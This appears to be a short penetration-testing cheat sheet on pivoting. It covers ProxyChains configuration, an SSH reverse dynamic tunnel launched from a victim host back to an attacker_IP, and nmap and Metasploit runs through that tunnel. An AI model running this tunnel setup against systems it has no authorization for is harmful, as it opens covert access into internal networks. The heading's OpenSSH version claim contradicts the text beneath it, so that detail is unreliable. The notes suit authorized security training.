# Pivoting

### ProxyChains

#### Greater than OpenSSH 7.6

If attacking a victim running OpenSSH version lower than 7.6, your process will be different. Older versions don't support -R and have to use a two-way proxy with -D

##### On Attacker Box

Open /etc/proxychains4.conf. 

Comment strictchain and uncomment dynamicchain. Uncomment quitemode. Comment proxydns. Then change the default config at the bottom from socks4 127.0.0.1 9080 to socks5 and whatever port you want to use.

Note: For RDP, make sure xclip is installed.

##### Make sure that SSH is listening on Attacker Box

```
Sudo systemctl start ssh.service                                                                                  
```

##### On Victim Box

```
ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port                                                                                                  
```

This only requires an ssh client on the victim machine which is extremely common. Only other thing required it to start ssh on your attacker box, as well as a port forwarding rule if it's going over the internet. 

##### On Attacker Box

```
Sudo proxychains nmap --top-ports=20 -sT -sV -sC  -v --open  -Pn IP_Address
Sudo proxychains nmap -iL scope -F -sT -v -Pn | tee fast_scan
```

You can run wrap almost any tool inside of proxychains to force it through the ssh tunnel, including things like metasploit/msfconsole. Extremely useful to utilize proxy 'fun' even if your meta module/other tool doesn't support proxy configuration.

##### Wrapping Metasploit inside of Proxychains

```
sudo proxychains msfconsole
```

This prevents you from having to setup proxies within each module in meta. Some modules don't support proxies so just another layer of difficulty that proxychains helps us avoid.
